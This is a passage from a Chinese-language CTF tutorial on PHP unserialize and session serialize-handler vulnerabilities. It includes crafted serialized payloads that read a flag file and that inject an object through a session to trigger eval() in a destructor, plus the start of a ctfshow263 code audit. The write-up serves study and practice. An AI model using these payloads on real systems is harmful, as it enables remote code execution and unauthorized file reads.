class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//index.php</span><br><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-keyword">require_once</span> <span class="hljs-string">&#x27;shield.php&#x27;</span>;<br>    <span class="hljs-variable">$x</span> = <span class="hljs-keyword">new</span> Shield();<br>    <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;class&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$g</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;class&#x27;</span>];<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$g</span>)) &#123;<br>        <span class="hljs-variable">$x</span> = unserialize(<span class="hljs-variable">$g</span>);<br>    &#125;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$x</span> - readfile();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//shield.php</span><br><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-comment">//flag is in pctf.php</span><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Shield</span></span><br><span class="hljs-class">    </span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$filename</span> = <span class="hljs-string">&#x27;&#x27;</span></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;file = <span class="hljs-variable">$filename</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">readfile</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">empty</span>(<span class="hljs-keyword">$this</span>-&gt;file) &amp;&amp; stripos(<span class="hljs-keyword">$this</span>-&gt;file, <span class="hljs-string">&#x27;..&#x27;</span>) === <span class="hljs-literal">false</span> &amp;&amp; stripos(<span class="hljs-keyword">$this</span>-&gt;file, <span class="hljs-string">&#x27;/&#x27;</span>) === <span class="hljs-literal">false</span> &amp;&amp; stripos(<span class="hljs-keyword">$this</span>-&gt;file, <span class="hljs-string">&#x27;\\&#x27;</span>) == <span class="hljs-literal">false</span>) &#123;<br>                <span class="hljs-keyword">return</span> @file_get_contents(<span class="hljs-keyword">$this</span>-&gt;file);<br>            &#125;<br>        &#125;<br>    &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>直接这样读取 pctf.php 返回 file not found</p><p>构造：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-comment">//flag is in pctf.php</span><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Shield</span></span><br><span class="hljs-class">    </span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$filename</span> = <span class="hljs-string">&#x27;&#x27;</span></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;file = <span class="hljs-variable">$filename</span>;<br>        &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">readfile</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">empty</span>(<span class="hljs-keyword">$this</span>-&gt;file) &amp;&amp; stripos(<span class="hljs-keyword">$this</span>-&gt;file, <span class="hljs-string">&#x27;..&#x27;</span>) === <span class="hljs-literal">false</span> &amp;&amp; stripos(<span class="hljs-keyword">$this</span>-&gt;file, <span class="hljs-string">&#x27;/&#x27;</span>) === <span class="hljs-literal">false</span> &amp;&amp; stripos(<span class="hljs-keyword">$this</span>-&gt;file, <span class="hljs-string">&#x27;\\&#x27;</span>) == <span class="hljs-literal">false</span>) &#123;<br>                <span class="hljs-keyword">return</span> @file_get_contents(<span class="hljs-keyword">$this</span>-&gt;file);<br>            &#125;<br>        &#125;<br>    &#125;<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> Shield(pctf.php);<br><span class="hljs-variable">$a</span> = serialize(<span class="hljs-variable">$a</span>);<br>var_dump(<span class="hljs-variable">$a</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><blockquote><p>index.php?class=O:6:”Shield”:1:{s:4:”file”;s:8:”pctf.php”;}</p></blockquote><h2 id="PHP-session-反序列化"><a href="#PHP-session-反序列化" class="headerlink" title="PHP session 反序列化"></a>PHP session 反序列化</h2><blockquote><p>当 session_start()被调用或者 php.ini 中 session.auto_start = 1 时，PHP 内部调用会话管理器，将用户 session 序列化以后，存储到指定目录（默认为/tmp）</p></blockquote><h3 id="处理器"><a href="#处理器" class="headerlink" title="处理器"></a>处理器</h3><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/2021/07/10/.png"></p><h3 id="ini-中相关的配置"><a href="#ini-中相关的配置" class="headerlink" title="ini 中相关的配置"></a>ini 中相关的配置</h3><p>配置文件 php.ini 中含有 session 的相关配置</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">session</span>.save_path=&quot;&quot;   <span class="hljs-comment">--设置session的存储路径,默认在/tmp</span><br><span class="hljs-keyword">session</span>.auto_start   <span class="hljs-comment">--指定会话模块是否在请求开始时启动一个会话,默认为0不启动</span><br><span class="hljs-keyword">session</span>.serialize_handler   <span class="hljs-comment">--定义用来序列化/反序列化的处理器名字。默认使用phpsession.save_handler=&quot;&quot; --设定用户自定义存储函数，如果想使用PHP内置会话存储机制之外的可以使用本函数(数据库等方式)，比如files就是session默认以文件的方式进行存储</span><br></code></pre></td></tr></table></figure><h3 id="代码中引擎设置"><a href="#代码中引擎设置" class="headerlink" title="代码中引擎设置"></a>代码中引擎设置</h3><p>在 PHP 中默认使用的是 PHP 引擎，如果要修改为其他的引擎，只需要添加代码</p><p><code>ini_set(&#39;session.serialize_handler&#39;, &#39;需要设置的引擎&#39;);</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>ini_set(<span class="hljs-string">&#x27;session.serialize_handler&#x27;</span>, <span class="hljs-string">&#x27;php_serialize&#x27;</span>);<br>session_start();<br></code></pre></td></tr></table></figure><h3 id="不同引擎存储差异"><a href="#不同引擎存储差异" class="headerlink" title="不同引擎存储差异"></a>不同引擎存储差异</h3><p>php 中的 session 内容是以<strong>文件</strong>方式来存储的，由<code>session.save_handler</code>来决定。文件名由<code>sess_sessionid</code>命名，文件内容则为 session 序列化后的值，文件位置在 ini 的<code>session.save_path</code>中 <strong>phpstudy 本地位置：/Extensions/tmp/tmp</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    ini_set(<span class="hljs-string">&#x27;session.serialize_handler&#x27;</span>,<span class="hljs-string">&#x27;php&#x27;</span>);<br>    session_start();<br><br>    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;name&#x27;</span>] = <span class="hljs-string">&#x27;test&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><ul><li>当<code>session.serialize_handler</code>为<code>php</code>时</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">name|s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;test&quot;</span>;<br></code></pre></td></tr></table></figure><ul><li>当<code>session.serialize_handler</code>为<code>php_serialize</code>时</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">a:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;name&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;test&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><ul><li>当<code>session.serialize_handler</code>为<code>php_binary</code>时</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;<span class="hljs-number">0x04</span>&gt;names:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;test&quot;</span>;<br></code></pre></td></tr></table></figure><h3 id="漏洞原因"><a href="#漏洞原因" class="headerlink" title="漏洞原因"></a>漏洞原因</h3><p>PHP 中的 Session 的实现是没有的问题，危害主要是由于程序员的 Session 使用不当而引起的。如果 PHP 在反序列化存储的 $_SESSION 数据时的使用的处理器和序列化时使用的处理器不同，会导致数据无法正确反序列化，通过特殊的构造，甚至可以伪造任意数据。常见的比如存入 session 时用的处理器为 php_serialize,反序列化时用的处理器是 php</p><p><strong>php 大于 5.5.4 的版本中默认使用 php_serialize 规则</strong></p><p>常见的比如存入 session 时用的处理器为 php_serialize，反序列化时用的处理器是 php</p><blockquote><p>当配置选项 session.auto_start ＝ Off，两个脚本注册 Session 会话时使用的序列化处理器不同，就会出现安全问题</p><p>当配置选项 session.auto_start ＝ On 会自动注册 Session 会话，因为该过程是发生在脚本代码执行前，所以在脚本中设定的包括序列化处理器在内的 session 相关配选项的设置是不起作用的，因此一些需要在脚本中设置序列化处理器配置的程序会在 session.auto_start ＝ On 时，销毁自动生成的 Session 会话，然后设置需要的序列化处理器，再调用 session_start()函数注册会话，这时如果脚本中设置的序列化处理器与 php.ini 中设置的不同，就会出现安全问题,因为 PHP 自动注册 Session 会话是在脚本执行前，所以通过该方式只能注入 PHP 的内置类</p></blockquote><p>比如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;ryat&#x27;</span>] = <span class="hljs-string">&#x27;|O:8:&quot;stdClass&quot;:0:&#123;&#125;&#x27;</span>;<br></code></pre></td></tr></table></figure><p>上面的$_SESSION 数据 在存储时使用的序列化处理器为 php_serialize 存储的格式如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">a:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;ryat&quot;</span>;s:<span class="hljs-number">20</span>:<span class="hljs-string">&quot;|O:8:&quot;</span><span class="hljs-built_in">stdClass</span><span class="hljs-string">&quot;:0:&#123;&#125;&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p>在读取数据时如果用的反序列化处理器不是 php_serialize 而是 php 的话 那么反序列化后的数据将会变成：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#!php</span><br><span class="hljs-comment">// var_dump($_SESSION);</span><br><span class="hljs-keyword">array</span>(<span class="hljs-number">1</span>) &#123;<br>  [<span class="hljs-string">&quot;a:1:&#123;s:4:&quot;</span>ryat<span class="hljs-string">&quot;;s:20:&quot;</span><span class="hljs-string">&quot;]=&gt;</span><br><span class="hljs-string">  object(stdClass)#1 (0) &#123;</span><br><span class="hljs-string">  &#125;</span><br><span class="hljs-string">&#125;</span><br></code></pre></td></tr></table></figure><p>则反序列化后还原得到一个新的对象 通过注入 <code>|</code> 字符伪造了对象的序列化数据</p><h4 id="漏洞测试"><a href="#漏洞测试" class="headerlink" title="漏洞测试"></a>漏洞测试</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//s1.php</span><br><span class="hljs-meta">&lt;?php</span><br>ini_set(<span class="hljs-string">&#x27;session.serialize_handler&#x27;</span>, <span class="hljs-string">&#x27;php_serialize&#x27;</span>);<br>session_start();<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&quot;spoock&quot;</span>]=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;a&quot;</span>];<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//s2.php</span><br><span class="hljs-meta">&lt;?php</span><br>ini_set(<span class="hljs-string">&#x27;session.serialize_handler&#x27;</span>, <span class="hljs-string">&#x27;php&#x27;</span>);<br>session_start();<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">lemon</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$hi</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;hi = <span class="hljs-string">&#x27;phpinfo();&#x27;</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-keyword">$this</span>-&gt;hi);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>先访问一下 s2 应为空</p><p>接着访问<code>s1.php?a=|O:5:&quot;lemon&quot;:1:&#123;s:2:&quot;hi&quot;;s:14:&quot;echo &quot;spoock&quot;;&quot;;&#125;</code></p><p>然后访问一下 s2 回显 spoock，传入的数据会按照<strong>php_serialize</strong>来进行序列化。 此时访问 us2.php 时，页面输出，<code>spoock</code>成功执行了我们构造的函数。因为在访问 us2.php 时，程序会按照<strong>php</strong>来反序列化 SESSION 中的数据，实例化 lemon 对象，session 反序列化会执行里面销毁前的魔术函数<code>__destruct()</code>，前面的<code>__construct()</code>就不再执行了。</p><h3 id="题"><a href="#题" class="headerlink" title="题"></a>题</h3><h4 id="ctfshow-1"><a href="#ctfshow-1" class="headerlink" title="ctfshow"></a>ctfshow</h4><ul><li>ctfshow263</li></ul><p>下载源码，代码审计</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//index.php</span><br><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br>session_start();<br><span class="hljs-comment">//超过5次禁止登陆</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;limit&#x27;</span>]))&#123;<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;limti&#x27;</span>]&gt;<span class="hljs-number">5</span>?<span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;登陆失败次数超过限制&quot;</span>):<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;limit&#x27;</span>]=base64_decode(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;limit&#x27;</span>]);<br><span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;limit&#x27;</span>] = base64_encode(base64_decode(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;limit&#x27;</span>]) +<span class="hljs-number">1</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br> setcookie(<span class="hljs-string">&quot;limit&quot;</span>,base64_encode(<span class="hljs-string">&#x27;1&#x27;</span>));<br> <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;limit&#x27;</span>]= <span class="hljs-number">1</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>注意此处有</p><blockquote><p>session_start();</p><p>这个审计下来五次登录错误就禁止了，但仔细一看<code>$_SESSION[&#39;limti&#39;]&gt;5</code>拼写有误，就是吓人的，下面两行代码必定执行</p><p>$_SESSION[‘limit’]=base64_decode($_COOKIE[‘limit’]);</p><p>$_COOKIE[‘limit’] = base64_encode(base64_decode($_COOKIE[‘limit’]) +1);</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//check.php</span><br><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">require_once</span> <span class="hljs-string">&#x27;inc/inc.php&#x27;</span>;<br><span class="hljs-variable">$GET</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;u&quot;</span>=&gt;<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;u&#x27;</span>],<span class="hljs-string">&quot;pass&quot;</span>=&gt;<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;pass&#x27;</span>]);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$GET</span>)&#123;<br><span class="hljs-variable">$data</span>= <span class="hljs-variable">$db</span>-&gt;get(<span class="hljs-string">&#x27;admin&#x27;</span>,<br>[<span class="hljs-string">&#x27;id&#x27;</span>,<br><span class="hljs-string">&#x27;UserName0&#x27;</span><br>],[<br><span class="hljs-string">&quot;AND&quot;</span>=&gt;[<br><span class="hljs-string">&quot;UserName0[=]&quot;</span>=&gt;<span class="hljs-variable">$GET</span>[<span class="hljs-string">&#x27;u&#x27;</span>],<br><span class="hljs-string">&quot;PassWord1[=]&quot;</span>=&gt;<span class="hljs-variable">$GET</span>[<span class="hljs-string">&#x27;pass&#x27;</span>] <span class="hljs-comment">//密码必须为128位大小写字母+数字+特殊符号，防止爆破</span><br>]<br>]);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$data</span>[<span class="hljs-string">&#x27;id&#x27;</span>])&#123;<br><span class="hljs-comment">//登陆成功取消次数累计</span><br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;limit&#x27;</span>]= <span class="hljs-number">0</span>;<br><span class="hljs-keyword">echo</span> json_encode(<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;success&quot;</span>,<span class="hljs-string">&quot;msg&quot;</span>=&gt;<span class="hljs-string">&quot;欢迎您&quot;</span>.<span class="hljs-variable">$data</span>[<span class="hljs-string">&#x27;UserName0&#x27;</span>]));<br>&#125;<span class="hljs-keyword">else</span>&#123;<br><span class="hljs-comment">//登陆失败累计次数加1</span><br><span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;limit&#x27;</span>] = base64_encode(base64_decode(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;limit&#x27;</span>])+<span class="hljs-number">1</span>);<br><span class="hljs-keyword">echo</span> json_encode(<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;error&quot;</span>,<span class="hljs-string">&quot;msg&quot;</span>=&gt;<span class="hljs-string">&quot;登陆失败&quot;</span>));<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>这里不可能会登录成功，下面代码也必定执行</p><p>$_COOKIE[‘limit’] = base64_encode(base64_decode($_COOKIE[‘limit’])+1);<br>echo json_encode(array(“error”,”msg”=&gt;”登陆失败”));</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//inc.php</span><br><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br>ini_set(<span class="hljs-string">&#x27;display_errors&#x27;</span>, <span class="hljs-number">0</span>);<br>ini_set(<span class="hljs-string">&#x27;session.serialize_handler&#x27;</span>, <span class="hljs-string">&#x27;php&#x27;</span>);<br>date_default_timezone_set(<span class="hljs-string">&quot;Asia/Shanghai&quot;</span>);<br>session_start();<br><span class="hljs-keyword">use</span> \<span class="hljs-title">CTFSHOW</span>\<span class="hljs-title">CTFSHOW</span>;<br><span class="hljs-keyword">require_once</span> <span class="hljs-string">&#x27;CTFSHOW.php&#x27;</span>;<br><span class="hljs-variable">$db</span> = <span class="hljs-keyword">new</span> CTFSHOW([<br>    <span class="hljs-string">&#x27;database_type&#x27;</span> =&gt; <span class="hljs-string">&#x27;mysql&#x27;</span>,<br>    <span class="hljs-string">&#x27;database_name&#x27;</span> =&gt; <span class="hljs-string">&#x27;web&#x27;</span>,<br>    <span class="hljs-string">&#x27;server&#x27;</span> =&gt; <span class="hljs-string">&#x27;localhost&#x27;</span>,<br>    <span class="hljs-string">&#x27;username&#x27;</span> =&gt; <span class="hljs-string">&#x27;root&#x27;</span>,<br>    <span class="hljs-string">&#x27;password&#x27;</span> =&gt; <span class="hljs-string">&#x27;root&#x27;</span>,<br>    <span class="hljs-string">&#x27;charset&#x27;</span> =&gt; <span class="hljs-string">&#x27;utf8&#x27;</span>,<br>    <span class="hljs-string">&#x27;port&#x27;</span> =&gt; <span class="hljs-number">3306</span>,<br>    <span class="hljs-string">&#x27;prefix&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>    <span class="hljs-string">&#x27;option&#x27;</span> =&gt; [<br>        PDO::ATTR_CASE =&gt; PDO::CASE_NATURAL<br>    ]<br>]);<br><span class="hljs-comment">// sql注入检查</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checkForm</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$str</span>))&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">return</span> preg_match(<span class="hljs-string">&quot;/select|update|drop|union|and|or|ascii|if|sys|substr|sleep|from|where|0x|hex|bin|char|file|ord|limit|by|\`|\~|\!|\@|\#|\\$|\%|\^|\\|\&amp;|\*|\(|\)|\（|\）|\+|\=|\[|\]|\;|\:|\&#x27;|\&quot;|\&lt;|\,|\&gt;|\?/i&quot;</span>,<span class="hljs-variable">$str</span>);<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$status</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$username</span>,<span class="hljs-variable">$password</span></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;username = <span class="hljs-variable">$username</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;password = <span class="hljs-variable">$password</span>;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">setStatus</span>(<span class="hljs-params"><span class="hljs-variable">$s</span></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;status=<span class="hljs-variable">$s</span>;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        file_put_contents(<span class="hljs-string">&quot;log-&quot;</span>.<span class="hljs-keyword">$this</span>-&gt;username, <span class="hljs-string">&quot;使用&quot;</span>.<span class="hljs-keyword">$this</span>-&gt;password.<span class="hljs-string">&quot;登陆&quot;</span>.(<span class="hljs-keyword">$this</span>-&gt;status?<span class="hljs-string">&quot;成功&quot;</span>:<span class="hljs-string">&quot;失败&quot;</span>).<span class="hljs-string">&quot;----&quot;</span>.date_create()-&gt;format(<span class="hljs-string">&#x27;Y-m-d H:i:s&#x27;</span>));<br>    &#125;<br>&#125;<br><span class="hljs-comment">/*生成唯一标志</span><br><span class="hljs-comment">*标准的UUID格式为：xxxxxxxx-xxxx-xxxx-xxxxxx-xxxxxxxxxx(8-4-4-4-12)</span><br><span class="hljs-comment">*/</span><br><span class="hljs-function"><span class="hljs-keyword">function</span>  <span class="hljs-title">uuid</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$chars</span> = md5(uniqid(mt_rand(), <span class="hljs-literal">true</span>));<br>    <span class="hljs-variable">$uuid</span> = substr ( <span class="hljs-variable">$chars</span>, <span class="hljs-number">0</span>, <span class="hljs-number">8</span> ) . <span class="hljs-string">&#x27;-&#x27;</span><br>            . substr ( <span class="hljs-variable">$chars</span>, <span class="hljs-number">8</span>, <span class="hljs-number">4</span> ) . <span class="hljs-string">&#x27;-&#x27;</span><br>            . substr ( <span class="hljs-variable">$chars</span>, <span class="hljs-number">12</span>, <span class="hljs-number">4</span> ) . <span class="hljs-string">&#x27;-&#x27;</span><br>            . substr ( <span class="hljs-variable">$chars</span>, <span class="hljs-number">16</span>, <span class="hljs-number">4</span> ) . <span class="hljs-string">&#x27;-&#x27;</span><br>            . substr ( <span class="hljs-variable">$chars</span>, <span class="hljs-number">20</span>, <span class="hljs-number">12</span> );<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$uuid</span> ;<br>&#125;<br></code></pre></td></tr></table></figure><p>注意此处</p><blockquote><p>ini_set(‘session.serialize_handler’, ‘php’);</p></blockquote><p>出现了一个写文件的函数，回顾 index.php 发现<code>$this-&gt;username和$this-&gt;password</code>是可控的，而又被包含在 